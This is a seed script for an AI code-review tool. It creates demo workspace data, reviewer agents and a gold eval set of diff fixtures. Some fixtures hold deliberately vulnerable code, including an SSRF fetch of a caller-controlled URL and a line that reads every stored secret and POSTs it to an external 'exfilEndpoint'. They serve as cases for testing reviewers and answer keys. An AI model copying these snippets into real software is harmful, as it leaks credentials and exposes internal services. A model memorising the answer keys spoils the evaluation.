import 'dotenv/config';
import { createDb, type Db } from './client.js';
import * as t from './schema.js';
import { eq, and } from 'drizzle-orm';
import {
  GENERAL_REVIEWER_PROMPT,
  SECURITY_REVIEWER_PROMPT,
  PERFORMANCE_REVIEWER_PROMPT,
  TEST_QUALITY_REVIEWER_PROMPT,
  API_CONTRACT_REVIEWER_PROMPT,
} from './seed-prompts.js';
import { TEST_QUALITY_SKILLS, API_CONTRACT_SKILLS } from './seed-skills.js';
import { validateFreeze } from '../modules/eval/diff-freeze.js';
import { computeFingerprint } from '../modules/eval/fingerprint.js';
import { EvalRepository } from '../modules/eval/repository.js';
import type {
  EvalExpectedItem,
  EvalForbiddenRegion,
  EvalSourceFinding,
  FindingKind,
  Severity,
  FindingCategory,
} from '@devdigest/shared';

/** Default provider/model for the built-in reviewer agents. */
const DEFAULT_PROVIDER = 'openrouter' as const;
const DEFAULT_MODEL = 'deepseek/deepseek-v4-flash';

/**
 * Seed the starter's demo data. Idempotent: re-running upserts the default
 * workspace/user and the demo fixtures.
 *
 * Seeds: default workspace + system user + membership, default settings,
 * demo repo (acme/payments-api), PR #482 with files/commits, a sample review
 * with a few findings, and the three built-in agents (General + Security +
 * Performance), all on the default openrouter/deepseek-v4-flash provider+model.
 *
 * Course lessons populate the other tables (skills, conventions, memory, eval,
 * …) once their features are built — they start empty here.
 */

export const DEFAULT_WORKSPACE_NAME = 'default';
export const SYSTEM_USER_EMAIL = 'you@local';

export async function seed(db: Db): Promise<{ workspaceId: string; userId: string }> {
  // ---- workspace + user (no-auth defaults) ----
  let [ws] = await db
    .select()
    .from(t.workspaces)
    .where(eq(t.workspaces.name, DEFAULT_WORKSPACE_NAME));
  if (!ws) {
    [ws] = await db
      .insert(t.workspaces)
      .values({ name: DEFAULT_WORKSPACE_NAME })
      .returning();
  }
  const workspaceId = ws!.id;

  let [user] = await db.select().from(t.users).where(eq(t.users.email, SYSTEM_USER_EMAIL));
  if (!user) {
    [user] = await db
      .insert(t.users)
      .values({ email: SYSTEM_USER_EMAIL, name: 'You' })
      .returning();
  }
  const userId = user!.id;

  await db
    .insert(t.workspaceMembers)
    .values({ workspaceId, userId, role: 'owner' })
    .onConflictDoNothing();

  // ---- default settings ----
  const defaultSettings: Record<string, unknown> = {
    polling_interval_min: 5,
    theme: 'dark',
    density: 'regular',
    sync_to_folder: true,
  };
  for (const [key, value] of Object.entries(defaultSettings)) {
    await db
      .insert(t.settings)
      .values({ workspaceId, userId, key, value })
      .onConflictDoNothing();
  }

  // ---- demo repo (acme/payments-api) ----
  let [repo] = await db
    .select()
    .from(t.repos)
    .where(and(eq(t.repos.workspaceId, workspaceId), eq(t.repos.fullName, 'acme/payments-api')));
  if (!repo) {
    [repo] = await db
      .insert(t.repos)
      .values({
        workspaceId,
        owner: 'acme',
        name: 'payments-api',
        fullName: 'acme/payments-api',
        defaultBranch: 'main',
        clonePath: null,
        createdBy: userId,
      })
      .returning();
  }
  const repoId = repo!.id;

  // ---- PR #482 (rate limiting) ----
  let [pr] = await db
    .select()
    .from(t.pullRequests)
    .where(and(eq(t.pullRequests.repoId, repoId), eq(t.pullRequests.number, 482)));
  if (!pr) {
    [pr] = await db
      .insert(t.pullRequests)
      .values({
        workspaceId,
        repoId,
        number: 482,
        title: 'Add rate limiting to public API endpoints',
        author: 'marisa.koch',
        branch: 'feat/rate-limit-public',
        base: 'main',
        headSha: 'a1b2c3d4e5f6',
        additions: 247,
        deletions: 38,
        filesCount: 9,
        status: 'needs_review',
        body: 'Add rate limiting to public API endpoints to prevent abuse from unauthenticated clients.',
      })
      .returning();

    // pr_files (subset)
    await db.insert(t.prFiles).values([
      { prId: pr!.id, path: 'src/middleware/ratelimit.ts', additions: 84, deletions: 0 },
      { prId: pr!.id, path: 'src/api/public/webhooks.ts', additions: 31, deletions: 6 },
      { prId: pr!.id, path: 'src/config.ts', additions: 4, deletions: 0 },
      { prId: pr!.id, path: 'src/api/users.ts', additions: 7, deletions: 2 },
    ]);

    // pr_commits
    await db.insert(t.prCommits).values({
      prId: pr!.id,
      sha: 'a1b2c3d4e5f6',
      message: 'Add token-bucket rate limiter',
      author: 'marisa.koch',
    });

    // a sample review + findings so the PR shows results before the first run
    const [review] = await db
      .insert(t.reviews)
      .values({
        workspaceId,
        prId: pr!.id,
        kind: 'review',
        verdict: 'request_changes',
        summary:
          'Solid middleware approach, but a Stripe secret key is committed in plaintext and the user-list endpoint introduces an N+1 query under the new limiter.',
        score: 61,
        model: 'seed',
      })
      .returning();

    await db.insert(t.findings).values([
      {
        reviewId: review!.id,
        file: 'src/config.ts',
        startLine: 12,
        endLine: 12,
        severity: 'CRITICAL',
        category: 'security',
        title: 'Hardcoded Stripe secret key in commit',
        rationale: 'Line 12 contains a literal `sk_live_` Stripe secret key.',
        suggestion: 'Move to env var and rotate the key immediately.',
        confidence: 0.98,
      },
      {
        reviewId: review!.id,
        file: 'src/api/users.ts',
        startLine: 45,
        endLine: 52,
        severity: 'WARNING',
        category: 'perf',
        title: 'N+1 query in user list endpoint',
        rationale: 'Loop issues one query per user → N+1.',
        suggestion: 'Use a single IN query and group in memory.',
        confidence: 0.86,
      },
    ]);
  }

  // ---- built-in agents (the three starter presets) ----
  // Prompt bodies live in ./seed-prompts.ts (mirrored in docs/agent-prompts/*.md).
  const seedAgents: Array<typeof t.agents.$inferInsert> = [
    {
      workspaceId,
      name: 'General Reviewer',
      description: 'Reviews a PR diff for bugs, correctness, and clarity.',
      provider: DEFAULT_PROVIDER,
      model: DEFAULT_MODEL,
      systemPrompt: GENERAL_REVIEWER_PROMPT,
      enabled: true,
      version: 1,
      createdBy: userId,
    },
    {
      workspaceId,
      name: 'Security Reviewer',
      description: 'Flags secrets, injection, SSRF and the lethal trifecta before merge.',
      provider: DEFAULT_PROVIDER,
      model: DEFAULT_MODEL,
      systemPrompt: SECURITY_REVIEWER_PROMPT,
      enabled: true,
      version: 1,
      createdBy: userId,
    },
    {
      workspaceId,
      name: 'Performance Reviewer',
      description: 'Catches N+1 queries, missing indexes, and hot-path allocations.',
      provider: DEFAULT_PROVIDER,
      model: DEFAULT_MODEL,
      systemPrompt: PERFORMANCE_REVIEWER_PROMPT,
      enabled: true,
      version: 1,
      createdBy: userId,
    },
    {
      workspaceId,
      name: 'Test Quality Reviewer',
      description:
        'Reviews tests: uncovered branches, missing corner cases, over-mocking, flake risk.',
      provider: DEFAULT_PROVIDER,
      model: DEFAULT_MODEL,
      systemPrompt: TEST_QUALITY_REVIEWER_PROMPT,
      enabled: true,
      version: 1,
      createdBy: userId,
    },
    {
      workspaceId,
      name: 'API Contract Reviewer',
      description:
        'Detects breaking API changes: removed fields, schema drift, semver violations, and missing deprecation markers.',
      provider: DEFAULT_PROVIDER,
      model: DEFAULT_MODEL,
      systemPrompt: API_CONTRACT_REVIEWER_PROMPT,
      enabled: true,
      version: 1,
      createdBy: userId,
    },
  ];
  for (const a of seedAgents) {
    const [existing] = await db
      .select()
      .from(t.agents)
      .where(and(eq(t.agents.workspaceId, workspaceId), eq(t.agents.name, a.name)));
    if (!existing) await db.insert(t.agents).values(a);
  }

  // ---- built-in skills (Test Quality demo set) ----
  // Idempotent: upsert by (workspace_id, name). The fourth skill is sourced as
  // 'imported_url' so a fresh workspace can demo the import preview path's
  // end state even before the user runs the import flow themselves.
  for (let i = 0; i < TEST_QUALITY_SKILLS.length; i++) {
    const s = TEST_QUALITY_SKILLS[i]!;
    const [existing] = await db
      .select()
      .from(t.skills)
      .where(and(eq(t.skills.workspaceId, workspaceId), eq(t.skills.name, s.name)));
    if (!existing) {
      // The last skill is the one we pretend was imported, to mirror the L02 walkthrough.
      const source = i === TEST_QUALITY_SKILLS.length - 1 ? 'imported_url' : s.source;
      await db.insert(t.skills).values({
        workspaceId,
        name: s.name,
        description: s.description,
        type: s.type,
        source,
        body: s.body,
        enabled: true,
        version: 1,
      });
    }
  }

  // ---- link the four skills to the Test Quality Reviewer in order ----
  const [tqAgent] = await db
    .select()
    .from(t.agents)
    .where(
      and(
        eq(t.agents.workspaceId, workspaceId),
        eq(t.agents.name, 'Test Quality Reviewer'),
      ),
    );
  if (tqAgent) {
    for (let i = 0; i < TEST_QUALITY_SKILLS.length; i++) {
      const seed = TEST_QUALITY_SKILLS[i]!;
      const [skillRow] = await db
        .select()
        .from(t.skills)
        .where(
          and(eq(t.skills.workspaceId, workspaceId), eq(t.skills.name, seed.name)),
        );
      if (!skillRow) continue;
      await db
        .insert(t.agentSkills)
        .values({ agentId: tqAgent.id, skillId: skillRow.id, order: i, enabled: true })
        .onConflictDoNothing();
    }
  }

  // ---- built-in skills (API Contract demo set) ----
  for (let i = 0; i < API_CONTRACT_SKILLS.length; i++) {
    const s = API_CONTRACT_SKILLS[i]!;
    const [existing] = await db
      .select()
      .from(t.skills)
      .where(and(eq(t.skills.workspaceId, workspaceId), eq(t.skills.name, s.name)));
    if (!existing) {
      const source = i === API_CONTRACT_SKILLS.length - 1 ? 'imported_url' : s.source;
      await db.insert(t.skills).values({
        workspaceId,
        name: s.name,
        description: s.description,
        type: s.type,
        source,
        body: s.body,
        enabled: true,
        version: 1,
      });
    }
  }

  // ---- link the four skills to the API Contract Reviewer in order ----
  const [acAgent] = await db
    .select()
    .from(t.agents)
    .where(
      and(
        eq(t.agents.workspaceId, workspaceId),
        eq(t.agents.name, 'API Contract Reviewer'),
      ),
    );
  if (acAgent) {
    for (let i = 0; i < API_CONTRACT_SKILLS.length; i++) {
      const seed = API_CONTRACT_SKILLS[i]!;
      const [skillRow] = await db
        .select()
        .from(t.skills)
        .where(
          and(eq(t.skills.workspaceId, workspaceId), eq(t.skills.name, seed.name)),
        );
      if (!skillRow) continue;
      await db
        .insert(t.agentSkills)
        .values({ agentId: acAgent.id, skillId: skillRow.id, order: i, enabled: true })
        .onConflictDoNothing();
    }
  }

  // ---- eval demo agent + gold set (T18, AC-7 / AC-55) ----
  // A dedicated demo agent carrying ≥8 frozen eval cases so the Eval
  // Dashboard, run history, and compare view render real data on first boot
  // instead of their empty states. Every fixture below is run through the
  // real `validateFreeze` gate (the exact AC-7 check a real case-creation
  // call goes through) BEFORE it is persisted: an unsatisfiable frozen diff
  // would fail its own scorer on first run and read as a permanent recall
  // regression — the bad-fixture trap recorded at `server/INSIGHTS.md:50`
  // and the A/B-verdict incident at root `INSIGHTS.md:17`.
  await seedEvalDemo(db, workspaceId, userId, repoId);

  return { workspaceId, userId };
}

interface EvalFixture {
  /** Also the case name (unique per owner ⇒ safe select-by-name dedupe key). */
  name: string;
  file: string;
  kind: FindingKind;
  severity: Severity;
  category: FindingCategory;
  title: string;
  rationale: string;
  expectation: 'must_find' | 'must_not_flag';
  /** New-side line the fixture's inserted hunk starts at. */
  startLine: number;
  /** Pure-addition hunk body — keeps new-side line arithmetic exact by construction. */
  diffLines: string[];
  regionStart: number;
  regionEnd: number;
  /** The user's OWN recorded reason — required for a `must_not_flag` case (AC-4); distinct from `rationale` above, which becomes the frozen `source_finding.rationale`. */
  notes?: string;
}

/** A single-hunk, pure-insertion unified diff — `startLine` is exactly the new-side line the first added line lands on, so callers never have to hand-count context/deletion lines. */
function buildAdditionDiff(file: string, startLine: number, lines: string[]): string {
  return [
    `diff --git a/${file} b/${file}`,
    `--- a/${file}`,
    `+++ b/${file}`,
    `@@ -${startLine},0 +${startLine},${lines.length} @@`,
    ...lines.map((l) => `+${l}`),
  ].join('\n');
}

const EVAL_FIXTURES: EvalFixture[] = [
  {
    name: 'Hardcoded Stripe secret key in commit',
    file: 'src/config/secrets.ts',
    kind: 'secret_leak',
    severity: 'CRITICAL',
    category: 'security',
    title: 'Hardcoded Stripe secret key in commit',
    rationale: 'Line 14 adds a literal `sk_live_` Stripe secret key directly into the config module.',
    expectation: 'must_find',
    startLine: 14,
    // Deliberately NOT a real-shaped key: the underscores break GitHub secret
    // scanning's `sk_live_[A-Za-z0-9]{24,}` pattern so this demo fixture cannot
    // be mistaken for a live credential — while the `sk_live_` prefix + the
    // `stripeSecretKey` name are still exactly what the demo agent should flag.
    diffLines: ["  stripeSecretKey: 'sk_live_FAKE_demo_fixture_not_a_real_key',"],
    regionStart: 14,
    regionEnd: 14,
  },
  {
    name: 'SSRF via caller-controlled webhook target URL',
    file: 'src/api/public/webhooks.ts',
    kind: 'finding',
    severity: 'CRITICAL',
    category: 'security',
    title: 'SSRF via caller-controlled webhook target URL',
    rationale:
      'targetUrl comes straight from the request body and is passed to fetch() with no allow-list or private-IP check — an attacker can point it at internal services such as the cloud metadata endpoint.',
    expectation: 'must_find',
    startLine: 24,
    diffLines: [
      'const upstream = await fetch(targetUrl, {',
      "  method: 'POST',",
      "  headers: { 'content-type': 'application/json' },",
      '  body: JSON.stringify(payload),',
      '});',
    ],
    regionStart: 24,
    regionEnd: 28,
  },
  {
    name: 'Missing Retry-After header on 429 response',
    file: 'src/middleware/ratelimit.ts',
    kind: 'finding',
    severity: 'WARNING',
    category: 'bug',
    title: 'Missing Retry-After header on 429 response',
    rationale:
      'The 429 response carries no Retry-After header, so a well-behaved client has no signal for when to retry and may hammer the endpoint immediately.',
    expectation: 'must_find',
    startLine: 41,
    diffLines: [
      'if (tokensRemaining <= 0) {',
      "  return reply.code(429).send({ error: 'rate_limited' });",
      '}',
    ],
    regionStart: 41,
    regionEnd: 43,
  },
  {
    name: 'N+1 query in user list endpoint',
    file: 'src/api/users.ts',
    kind: 'finding',
    severity: 'WARNING',
    category: 'perf',
    title: 'N+1 query in user list endpoint',
    rationale:
      "Issues one query per user inside the loop instead of a single batched IN query — N+1 under the new limiter's higher allowed throughput.",
    expectation: 'must_find',
    startLine: 58,
    diffLines: [
      'for (const id of userIds) {',
      '  const profile = await db.query.profiles.findFirst({ where: eq(profiles.userId, id) });',
      '  results.push(profile);',
      '}',
    ],
    regionStart: 58,
    regionEnd: 61,
  },
  {
    name: 'Lethal trifecta in nightly importer job',
    file: 'src/jobs/importer.ts',
    kind: 'lethal_trifecta',
    severity: 'CRITICAL',
    category: 'security',
    title: 'Lethal trifecta: secrets read, untrusted config URL, external exfil',
    rationale:
      'Reads secrets from the DB, accepts an attacker-controlled configUrl as untrusted input, and forwards the result to an external endpoint — private-data-access + untrusted-input + exfil-path in one function.',
    expectation: 'must_find',
    startLine: 30,
    diffLines: [
      'const secrets = await db.query.secrets.findMany();',
      'const remoteConfig = await fetch(req.query.configUrl).then((r) => r.json());',
      "await fetch(exfilEndpoint, { method: 'POST', body: JSON.stringify(secrets) });",
    ],
    regionStart: 30,
    regionEnd: 30,
  },
  {
    name: 'Unused import: deepClone',
    file: 'src/utils/format.ts',
    kind: 'finding',
    severity: 'SUGGESTION',
    category: 'style',
    title: 'Unused import: deepClone',
    rationale: 'deepClone is imported but never referenced in this file.',
    expectation: 'must_not_flag',
    startLine: 3,
    diffLines: ["import { deepClone } from '../lib/clone.js';"],
    regionStart: 3,
    regionEnd: 3,
    notes: 'Dismissed as noise — the linter already flags unused imports; not worth a reviewer comment.',
  },
  {
    name: 'Redundant null check on db client',
    file: 'src/api/health.ts',
    kind: 'finding',
    severity: 'SUGGESTION',
    category: 'bug',
    title: 'Redundant null check on db client',
    rationale: 'db is asserted non-null at module scope, so this null guard reads as dead code.',
    expectation: 'must_not_flag',
    startLine: 18,
    diffLines: [
      'if (db == null) {',
      "  return reply.code(503).send({ status: 'down' });",
      '}',
    ],
    regionStart: 18,
    regionEnd: 20,
    notes:
      'Dismissed — db is reassigned on hot reload in dev, so the guard is intentional defensive code, not dead code.',
  },
  {
    name: "Variable name 'tmp' is non-descriptive",
    file: 'src/api/session.ts',
    kind: 'finding',
    severity: 'SUGGESTION',
    category: 'style',
    title: "Variable name 'tmp' is non-descriptive",
    rationale: "'tmp' doesn't communicate intent; consider a name like sessionToken.",
    expectation: 'must_not_flag',
    startLine: 12,
    diffLines: ['const tmp = buildSessionToken(user);'],
    regionStart: 12,
    regionEnd: 12,
    notes: "Dismissed as a style nit outside the team's enforced conventions — not blocking.",
  },
];

/**
 * Seeds the T18 demo agent + its ≥8-case gold eval set (AC-55). Extends the
 * idempotent `pnpm db:seed` — re-running never duplicates a case, a source
 * finding, or the PR/review that carries them (each step is select-by-key
 * then conditional insert, the file's own house pattern at :242-248 above).
 */
async function seedEvalDemo(db: Db, workspaceId: string, userId: string, repoId: string): Promise<void> {
  // ---- source PR + review + findings the fixtures are frozen from ----
  let [evalPr] = await db
    .select()
    .from(t.pullRequests)
    .where(and(eq(t.pullRequests.repoId, repoId), eq(t.pullRequests.number, 483)));
  if (!evalPr) {
    [evalPr] = await db
      .insert(t.pullRequests)
      .values({
        workspaceId,
        repoId,
        number: 483,
        title: 'Eval gold-set source findings (seed only)',
        author: 'eval-seed',
        branch: 'chore/eval-fixtures',
        base: 'main',
        headSha: 'eva1eva1eva1',
        additions: 0,
        deletions: 0,
        filesCount: EVAL_FIXTURES.length,
        status: 'needs_review',
        body: "Synthetic PR whose findings back the demo agent's eval gold set (T18). Not a real change.",
      })
      .returning();
  }
  const evalPrId = evalPr!.id;

  let [evalReview] = await db
    .select()
    .from(t.reviews)
    .where(and(eq(t.reviews.prId, evalPrId), eq(t.reviews.kind, 'review')));
  if (!evalReview) {
    [evalReview] = await db
      .insert(t.reviews)
      .values({
        workspaceId,
        prId: evalPrId,
        kind: 'review',
        verdict: 'request_changes',
        summary: "Seed review whose findings back the demo agent's eval gold set.",
        score: 40,
        model: 'seed',
      })
      .returning();
  }
  const evalReviewId = evalReview!.id;

  // ---- the demo agent that owns the gold set ----
  let [evalAgent] = await db
    .select()
    .from(t.agents)
    .where(and(eq(t.agents.workspaceId, workspaceId), eq(t.agents.name, 'Eval Demo Reviewer')));
  if (!evalAgent) {
    [evalAgent] = await db
      .insert(t.agents)
      .values({
        workspaceId,
        name: 'Eval Demo Reviewer',
        description:
          'Demo agent pre-loaded with a gold eval set (T18) so the Eval Dashboard, run history, and compare view render real data on first boot.',
        provider: DEFAULT_PROVIDER,
        model: DEFAULT_MODEL,
        systemPrompt: GENERAL_REVIEWER_PROMPT,
        enabled: true,
        version: 1,
        createdBy: userId,
      })
      .returning();
  }
  const evalAgentId = evalAgent!.id;

  const evalRepo = new EvalRepository(db);

  for (const fixture of EVAL_FIXTURES) {
    const rawDiff = buildAdditionDiff(fixture.file, fixture.startLine, fixture.diffLines);

    const expectedItems: EvalExpectedItem[] =
      fixture.expectation === 'must_find'
        ? [
            {
              file: fixture.file,
              start_line: fixture.regionStart,
              end_line: fixture.regionEnd,
              kind: fixture.kind,
              severity: fixture.severity,
              category: fixture.category,
              title: fixture.title,
            },
          ]
        : [];
    const forbiddenRegion: EvalForbiddenRegion | null =
      fixture.expectation === 'must_not_flag'
        ? {
            file: fixture.file,
            start_line: fixture.regionStart,
            end_line: fixture.regionEnd,
            kind: fixture.kind,
          }
        : null;

    // AC-7, proven by calling the real validator — not by eye. A fixture
    // whose frozen diff can't ground its own expectation fails seeding
    // loudly instead of shipping an unsatisfiable case (AC-55).
    const validation = validateFreeze(rawDiff, fixture.expectation, expectedItems, forbiddenRegion);
    if (!validation.ok) {
      throw new Error(
        `seed: eval fixture '${fixture.name}' fails validateFreeze (${validation.reason}): ${validation.message}`,
      );
    }

    // ---- the source finding this case is frozen from (accepted ⇒ must_find, dismissed ⇒ must_not_flag) ----
    let [sourceFindingRow] = await db
      .select()
      .from(t.findings)
      .where(and(eq(t.findings.reviewId, evalReviewId), eq(t.findings.title, fixture.title)));
    if (!sourceFindingRow) {
      [sourceFindingRow] = await db
        .insert(t.findings)
        .values({
          reviewId: evalReviewId,
          file: fixture.file,
          startLine: fixture.regionStart,
          endLine: fixture.regionEnd,
          severity: fixture.severity,
          category: fixture.category,
          title: fixture.title,
          rationale: fixture.rationale,
          confidence: 0.9,
          kind: fixture.kind,
          acceptedAt: fixture.expectation === 'must_find' ? new Date('2026-06-20T10:00:00Z') : null,
          dismissedAt: fixture.expectation === 'must_not_flag' ? new Date('2026-06-20T10:00:00Z') : null,
        })
        .returning();
    }

    // ---- the eval case itself (house pattern: select-by-name, then conditional insert) ----
    const [existingCase] = await db
      .select()
      .from(t.evalCases)
      .where(
        and(
          eq(t.evalCases.workspaceId, workspaceId),
          eq(t.evalCases.ownerKind, 'agent'),
          eq(t.evalCases.ownerId, evalAgentId),
          eq(t.evalCases.name, fixture.name),
        ),
      );
    if (existingCase) continue;

    const sourceFinding: EvalSourceFinding = {
      finding_id: sourceFindingRow!.id,
      title: sourceFindingRow!.title,
      rationale: sourceFindingRow!.rationale,
      severity: fixture.severity,
      category: fixture.category,
      kind: fixture.kind,
      file: fixture.file,
      start_line: fixture.regionStart,
      end_line: fixture.regionEnd,
    };
    const inputMeta = { title: evalPr!.title, description: `Fixture: ${fixture.name}` };
    const fingerprint = computeFingerprint({
      diff: rawDiff,
      prMeta: inputMeta,
      expectation: fixture.expectation,
      expectedItems,
      forbiddenRegion,
    });

    await evalRepo.insertCase(workspaceId, {
      ownerKind: 'agent',
      ownerId: evalAgentId,
      name: fixture.name,
      expectation: fixture.expectation,
      inputDiff: rawDiff,
      inputFiles: [fixture.file],
      inputMeta,
      expectedOutput: expectedItems,
      notes: fixture.notes ?? null,
      sourceFindingId: sourceFindingRow!.id,
      sourceFinding,
      forbiddenRegion,
      inputFingerprint: fingerprint,
    });
  }
}

// CLI entrypoint
if (import.meta.url === `file://${process.argv[1]}`) {
  const url = process.env.DATABASE_URL;
  if (!url) {
    console.error('DATABASE_URL is required');
    process.exit(1);
  }
  const handle = createDb(url);
  seed(handle.db)
    .then(async (r) => {
      console.log('✓ seeded', r);
      await handle.close();
      process.exit(0);
    })
    .catch(async (err) => {
      console.error('✗ seed failed:', err);
      await handle.close();
      process.exit(1);
    });
}
